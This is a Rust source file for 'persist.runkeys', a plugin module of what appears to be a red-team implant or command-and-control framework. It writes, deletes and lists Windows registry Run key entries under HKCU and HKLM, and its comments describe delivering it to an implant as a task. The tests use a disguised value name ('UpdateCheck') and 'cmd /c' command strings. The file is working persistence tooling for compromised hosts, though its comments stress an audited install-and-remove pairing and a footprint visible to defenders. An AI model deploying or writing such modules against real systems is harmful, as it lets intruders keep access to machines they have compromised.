//! The persistence family's first module (architecture.md Sec 5.4):
//! `persist.runkeys`, the registry Run key seat -- one discrete
//! installable and removable technique, the pairing todo.md's family
//! criterion turns on: the verb that installs a seat is the verb that
//! removes it, and both ride the task audit every dispatched action
//! already enters.
//!
//! The grammar gives one verb three actions -- `install` writes the
//! value, `remove` deletes it, `list` reports what sits under the hives
//! (the default: a bare task is a read). HKCU holds the per-user seat
//! an ordinary implant context can write; HKLM the machine-wide one
//! elevation buys. The command line sits in the value as plain UTF-16
//! text -- the footprint is exactly one registry value, visible to any
//! blue-team reader that looks, and the module's manifest says so
//! rather than leaving it to be discovered.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load runkeys` task's content, then task `persist.runkeys`
//! like any compiled verb. A non-Windows build compiles for the lane
//! and refuses the verb at run time: the technique has no seat to
//! touch there.

mod arguments;
mod registry;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

// The action the Windows dispatch matches on; off Windows the verb
// refuses before the name is ever spoken, and an unused import would be
// a build warning the lane turns into a failure.
#[cfg(windows)]
use arguments::Action;

pub struct RunKeys;

impl Plugin for RunKeys {
    fn name(&self) -> &'static str {
        "runkeys"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("persist.runkeys", runkeys)]
    }
}

fn runkeys(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    arguments::validate(&arguments)?;
    execute(&arguments)
}

/// The Windows execution: the action the task named against the seat's
/// hive.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    match arguments.action {
        Action::Install => install(arguments),
        Action::Remove => remove(arguments),
        Action::List => list(arguments),
    }
}

/// The technique has no seat off Windows; the manifest's targets keep
/// the module off other loads, and this refusal keeps a stray dispatch
/// honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "persist.runkeys: registry run keys are a Windows technique; this \
         build runs on {}",
        std::env::consts::OS
    ))
}

#[cfg(windows)]
fn install(arguments: &Arguments) -> Result<String, String> {
    let (name, command) = (
        arguments.name.as_deref().unwrap_or_default(),
        arguments.command.as_deref().unwrap_or_default(),
    );
    // An existing value under the same name is replaced, the registry's
    // own semantics: installing over a seat retargets it, and the row
    // the answer prints is the seat as it now sits.
    match registry::write(arguments.hive, name, command) {
        Ok(()) => Ok(format!(
            "installed {}\\{} = {}",
            arguments.hive.seat_path(),
            name,
            command
        )),
        Err(status) => Err(format!(
            "persist.runkeys: {}\\{}: {}",
            arguments.hive.seat_path(),
            name,
            registry::status_message(status)
        )),
    }
}

#[cfg(windows)]
fn remove(arguments: &Arguments) -> Result<String, String> {
    let name = arguments.name.as_deref().unwrap_or_default();
    match registry::delete(arguments.hive, name) {
        Ok(()) => Ok(format!("removed {}\\{}", arguments.hive.seat_path(), name)),
        Err(status) => Err(format!(
            "persist.runkeys: {}\\{}: {}",
            arguments.hive.seat_path(),
            name,
            registry::status_message(status)
        )),
    }
}

/// The read: every seat under the task's hive, sorted by name so two
/// reads of one host report in the same order. A name riding the task
/// narrows the report to that seat -- the confirmation half of an
/// install the operator just ran.
#[cfg(windows)]
fn list(arguments: &Arguments) -> Result<String, String> {
    match registry::enumerate(arguments.hive) {
        Ok(seats) => {
            let mut seats = seats;
            seats.sort_by(|left, right| left.name.cmp(&right.name));
            let rows: Vec<String> = seats
                .iter()
                .filter(|seat| {
                    arguments
                        .name
                        .as_deref()
                        .is_none_or(|wanted| seat.name.eq_ignore_ascii_case(wanted))
                })
                .map(|seat| {
                    format!(
                        "{}\\{} = {}",
                        arguments.hive.seat_path(),
                        seat.name,
                        seat.command
                    )
                })
                .collect();
            Ok(if rows.is_empty() {
                format!("no run keys under {}", arguments.hive.seat_path())
            } else {
                rows.join("\n")
            })
        }
        Err(status) => Err(format!(
            "persist.runkeys: {}: {}",
            arguments.hive.seat_path(),
            registry::status_message(status)
        )),
    }
}

rod_plugin!(RunKeys);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_empty_task_is_the_read() {
        // The default action is list: a bare task reports and writes
        // nothing -- on a non-Windows build it refuses, naming why.
        #[cfg(windows)]
        {
            let output = runkeys("").expect("the read runs");
            assert!(output.contains("Run"), "{output}");
        }
        #[cfg(not(windows))]
        {
            let refusal = runkeys("").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }

    #[test]
    fn a_bad_grammar_refuses_before_anything_runs() {
        assert!(runkeys("uninstall x").is_err());
        assert!(runkeys("remove UpdateCheck").is_err());
        assert!(runkeys("install hkcu UpdateCheck").is_err());
        assert!(runkeys("remove hklm seat cmd /c x").is_err());
        assert!(runkeys("list hklm cmd /c x").is_err());
    }
}
